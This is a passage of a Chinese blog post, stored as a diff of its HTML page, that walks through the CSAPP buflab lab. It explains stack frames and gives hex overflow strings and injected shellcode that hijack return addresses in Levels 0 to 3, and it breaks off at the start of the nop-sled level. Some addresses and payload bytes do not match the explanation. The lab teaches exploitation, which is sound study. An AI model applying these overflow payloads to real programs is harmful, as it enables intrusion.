@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.2">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.2" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.2">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.2',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="CSAPP lab3 bufboomb本次实验的project为buflab，这个lab比上次lab2有意思多了，上次主要是读汇编代码太恶心了点，许多太难理解了。这次的lab主要为详细描述缓冲区溢出的shellcode编写，每个小的case非常有意思，花了差不多大概四天的时间，利用每天晚上的时间，终于把五个case全部通过，通过这5个case基本熟悉了shellcode的编写和缓冲区溢出的攻击原理">
+<meta name="keywords" content="代码实现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CSAPP】 Lab3">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;11&#x2F;26&#x2F;229&#x2F;index.html">
+<meta property="og:site_name" content="blow in the wind">
+<meta property="og:description" content="CSAPP lab3 bufboomb本次实验的project为buflab，这个lab比上次lab2有意思多了，上次主要是读汇编代码太恶心了点，许多太难理解了。这次的lab主要为详细描述缓冲区溢出的shellcode编写，每个小的case非常有意思，花了差不多大概四天的时间，利用每天晚上的时间，终于把五个case全部通过，通过这5个case基本熟悉了shellcode的编写和缓冲区溢出的攻击原理">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;26&#x2F;DFieZPoyp7hnsW4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;26&#x2F;nJHl9QcwD3qMUzT.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;26&#x2F;3W4eXo6zNFVnSCO.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;26&#x2F;gzNHyfrudtTAWpq.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;16&#x2F;xtyDOgT6Gm1AKdS.png">
+<meta property="og:updated_time" content="2020-11-26T07:52:41.244Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;11&#x2F;26&#x2F;DFieZPoyp7hnsW4.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/11/26/229/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>【CSAPP】 Lab3 | blow in the wind</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="blow in the wind" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">blow in the wind</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">no one will be your god, your god is just yourself!</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/mike-box" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/26/229/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="Mike meng">
+      <meta itemprop="description" content="a clever man and a foolish man!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blow in the wind">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【CSAPP】 Lab3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-11-26 13:57:44 / Modified: 15:52:41" itemprop="dateCreated datePublished" datetime="2020-11-26T13:57:44+08:00">2020-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81/" itemprop="url" rel="index">
+                    <span itemprop="name">代码</span>
+                  </a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2020/11/26/229/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/26/229/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CSAPP-lab3-bufboomb"><a href="#CSAPP-lab3-bufboomb" class="headerlink" title="CSAPP lab3 bufboomb"></a>CSAPP lab3 bufboomb</h1><p>本次实验的<code>project</code>为<code>buflab</code>，这个<code>lab</code>比上次<code>lab2</code>有意思多了，上次主要是读汇编代码太恶心了点，许多太难理解了。这次的<code>lab</code>主要为详细描述缓冲区溢出的<code>shellcode</code>编写，每个小的<code>case</code>非常有意思，花了差不多大概四天的时间，利用每天晚上的时间，终于把五个<code>case</code>全部通过，通过这<code>5</code>个<code>case</code>基本熟悉了<code>shellcode</code>的编写和缓冲区溢出的攻击原理，本质是利用堆栈模型的漏洞，利用函数返回值的跳转来进行不同的跳转。</p><a id="more"></a>
+<ul>
+<li>首先我们需要了解程序的调用过程和基本的汇编命令的指令的原理：</li>
+</ul>
+<ol>
+<li><code>call</code> 指令的执行原理：<code>Call address</code>,将下一条指令的地址入栈，然后跳转到<code>address</code>对应的指令。<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> [next]</span><br><span class="line"><span class="keyword">jmp</span> address</span><br></pre></td></tr></table></figure></li>
+<li><code>ret</code>指令的执行原理，<code>ret</code>将栈顶的数据出栈送入到<code>eip</code>寄存器，然后进行跳转。<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> %eip,</span><br><span class="line"><span class="keyword">jmp</span></span><br></pre></td></tr></table></figure></li>
+<li>堆栈中<code>procedure</code>的调用的基本过程，将被调用的函数的参数从右至左依次入栈;将下一条指令入栈，跳转到函数进行执行;进入到被执行的函数时，首先会将当前的<code>ebp</code>入栈。<br><img src="https://i.loli.net/2020/11/26/DFieZPoyp7hnsW4.png" alt="1"><br>搞清楚以上三点的信息后，对这<code>5</code>个<code>case</code>就能非常熟悉和了解了。</li>
+</ol>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>关于<code>getbuf</code>函数的原型:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以看到<code>getbuf</code>函数中栈上的申请的字符串的长度为<code>32</code>，我们缓冲区的溢出的原理也是对<code>buf</code>的空间进行连续的填充，直到将<code>getbuf</code>函数的返回指令的地址用我们自定义的地址进行覆盖，从而执行完<code>getbuf</code>函数后，在返回时将会跳转到我们所需要的地址即可。我们同时仔细分析一下<code>getbuf</code>函数的汇编代码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">080491f</span>4 &lt;getbuf&gt;:</span><br><span class="line"> <span class="number">80491f</span>4:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">80491f</span>5:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">80491f</span>7:       <span class="number">83</span> ec <span class="number">38</span>                sub    $<span class="number">0x38</span>,%esp</span><br><span class="line"> <span class="number">80491f</span>a:       <span class="number">8</span>d <span class="number">45</span> d8                lea    <span class="number">-0x28</span>(%ebp),%eax</span><br><span class="line"> <span class="number">80491f</span>d:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    %eax,(%esp)</span><br><span class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          call   <span class="number">8048</span>cfa &lt;Gets&gt;</span><br><span class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x1</span>,%eax</span><br><span class="line"> <span class="number">804920</span>a:       c9                      leave</span><br><span class="line"> <span class="number">804920b</span>:       c3                      ret</span><br></pre></td></tr></table></figure><br>从汇编代码中可以知道<code>buff</code>的偏移地址第<code>(0x28 + 8)</code>存储的为函数返回地址，所以我们只需要将<code>offset = (0x28 + 8)</code>的空间进行自定义填充即可，以下所有的题目基本上都类似的原理。</p>
+<h3 id="1-Level-0-Candle"><a href="#1-Level-0-Candle" class="headerlink" title="1. Level 0: Candle"></a>1. Level 0: Candle</h3><ul>
+<li>题目非常简单，只是要求能够正确执行函数<code>smoke</code>即可，我们只需要将<code>smoke</code>函数的地址写入<code>getbuf</code>的返回地址即可,我们只需要将<code>08048c18</code>写入返回地址即可。<br><img src="https://i.loli.net/2020/11/26/nJHl9QcwD3qMUzT.png" alt="1"><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">18</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-Level-1-Sparkler"><a href="#2-Level-1-Sparkler" class="headerlink" title="2. Level 1: Sparkler"></a>2. Level 1: Sparkler</h3></li>
+<li>题目非常简单，只是要求能够正确执行函数<code>fizz</code>即可，我们只需要将<code>fizz</code>函数的地址写入<code>getbuf</code>的返回地址即可,我们只需要将<code>08048c18</code>写入返回地址即可,与<code>level1</code>不一样的是还需要把参数<code>val</code>参数传入，并且此时参数的值为<code>cookie</code>的值，我们知道参数的偏移地址<code>offset = (0x28 + 12)</code>，我们只需要在此偏移处填入<code>cookie</code>的值即可。<br><img src="https://i.loli.net/2020/11/26/3W4eXo6zNFVnSCO.png" alt="2"><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">42</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span> <span class="number">08</span> d1 <span class="number">08</span> <span class="number">04</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-Level-2-Firecracker"><a href="#3-Level-2-Firecracker" class="headerlink" title="3.Level 2: Firecracker"></a>3.Level 2: Firecracker</h3></li>
+<li>这个稍微复杂点，只是要求能够正确执行函数<code>bang</code>，并且要求<code>global_value</code>的值与<code>cookie</code>的值相等，这就要求我们不仅返回执行<code>bang</code>函数，还需要对<code>global_value</code>的值进行更改。此题需要在栈上写入指令，并且执行栈上的指令修改全局变量的值，执行完成后跳转到<code>bang</code>函数即可。</li>
+<li>我们通过C语言写入汇编代码，然后进行编译翻译成机器指令即可，再将填入到栈中即可，需要执行的指令如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov $0x6830c384, %eax"</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">"mov %eax,0x804d100"</span>);    <span class="comment">// global_value = cookie</span></span><br><span class="line">    __asm__(<span class="string">"push $0x08048c9d"</span>);      <span class="comment">// set bang return address</span></span><br><span class="line">    __asm__(<span class="string">"ret"</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="https://i.loli.net/2020/11/26/gzNHyfrudtTAWpq.png" alt="3"></li>
+<li>本次即需要两次跳转，第一次跳转到栈上的指令起始地址<code>0x55682fb8</code>，设置全局变量；执行完成指令后进行第二次跳转到<code>bang</code>函数的入口地址<code>0x08048c9d</code>，最后的结果为：<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> a3 <span class="number">00</span> d1 <span class="number">04</span> <span class="number">08</span> <span class="number">68</span> <span class="number">9</span>d <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span> c3 <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> b8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="4-Level-3-Dynamite"><a href="#4-Level-3-Dynamite" class="headerlink" title="4. Level 3: Dynamite"></a>4. Level 3: Dynamite</h3><ul>
+<li>这个就比较复杂，需要改变<code>test</code>函数的执行逻辑，这就要求我们不仅返回执行<code>bang</code>函数，还需要对<code>global_value</code>的值进行更改，并且保证<code>test</code>函数最终能够正常运行。<code>test</code>函数原本逻辑如下所示：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possible corruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval(); </span><br><span class="line"></span><br><span class="line">    val = getbuf(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval()) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has been corrupted\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+如果按照正常逻辑，<code>getbuf</code>的返回值为<code>1</code>,而本题要求<code>val == cookie</code>，这就要求返回值为<code>cookie</code>，我们通过修改<code>getbuf</code>的返回值为<code>cookie</code>即可。我们仔细阅读汇编代码如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8048</span>db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">80491f</span>4 &lt;getbuf&gt;</span><br><span class="line"><span class="number">8048</span>dbe:       <span class="number">89</span> c3                   mov    %eax,%ebx</span><br><span class="line"><span class="number">8048</span>dc0:       e8 cb ff ff ff          call   <span class="number">8048</span>d90 &lt;uniqueval&gt;</span><br></pre></td></tr></table></figure>
+函数的返回值实际存放在<code>%eax</code>寄存器中，我们只需要修改<code>%eax</code>寄存器的值为<code>cookie</code>即可。本题还有比较关键的一点，我们在进行写缓冲区时把<code>test</code>函数的<code>%ebp</code>寄存器破坏掉了，我们返回前还需要恢复<code>%ebp</code>寄存器即可，我们通过<code>gdb</code>调试可以知道<code>%ebp</code>寄存器的地址为<code>0X55683010</code>。恢复的地址和修改寄存器的代码如下：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov $0x6830c384, %eax"</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">"mov $0X55683010, %ebp"</span>); <span class="comment">// resume ebp register</span></span><br><span class="line">    __asm__(<span class="string">"push $0x08048dbe"</span>); <span class="comment">// set return address</span></span><br><span class="line">    __asm__(<span class="string">"ret"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+我们通过上述编译后，将代码写入到栈上即可，并同时将<code>getbuf</code>函数的返回地址设置为上述指令的起始地址即可。最终的<code>buffer</code>为：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> <span class="number">68</span> de <span class="number">8</span>d <span class="number">04</span> <span class="number">08</span> c3 <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> b8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="5-Level-4-Nitroglycerin"><a href="#5-Level-4-Nitroglycerin" class="headerlink" title="5. Level 4: Nitroglycerin"></a>5. Level 4: Nitroglycerin</h3><ul>
+<li>本题与第<code>4</code>题相似，但是比较复杂的处理在于栈的地址为动态变换的，此时我们就不可能像之前处理那样，栈的返回地址直接写为固定，此时我们需要用到<code>nop sleds</code>。这个所谓的难点也并不复杂，表示我们可以将机器指令全部设置为<code>nop</code>,在<code>nop</code>之后紧挨着执行我们的修改指令，因此我们只需要保证跳转指令一定能够跳转到<code>nop</code>指令段中即可，题目中所谓的随机栈地址的范围变化为<code>[-240,240]</code>之间进行变动，我们只需要设定某个值保证跳转一定能够跳转到<code>nop</code>指令即可。</li>
+<li>此处我们将<code>512</code>个字节的内容全部设置为<code>nop</code>,只要保证指令一定能够跳转<code>nop</code>区间即可，因为<code>nop</code>执行结束后紧挨着即为我们需要执行的指令。</li>
+<li>我们同时还需要恢复<code>ebp</code>寄存器，我们仔细观察<code>ebp</code>寄存器实际为<code>esp</code>地址偏移<code>0x28</code>即可。因为地址从高往低增长，所以<code>$ebp = $esp + 28</code>，我们可以通过汇编代码得知。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08048e26</span> &lt;testn&gt;:</span><br><span class="line"> <span class="number">8048e26</span>:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">8048e27</span>:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048e29</span>:       <span class="number">53</span>                      push   %ebx</span><br><span class="line"> <span class="number">8048e2</span>a:       <span class="number">83</span> ec <span class="number">24</span>                sub    $<span class="number">0x24</span>,%esp</span><br><span class="line"> <span class="number">8048e2</span>d:       e8 <span class="number">5</span>e ff ff ff          call   <span class="number">8048</span>d90 &lt;uniqueval&gt;</span><br><span class="line"> <span class="number">8048e32</span>:       <span class="number">89</span> <span class="number">45</span> f4                mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">8048e35</span>:       e8 d2 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">804920</span>c &lt;getbufn&gt;</span><br></pre></td></tr></table></figure>
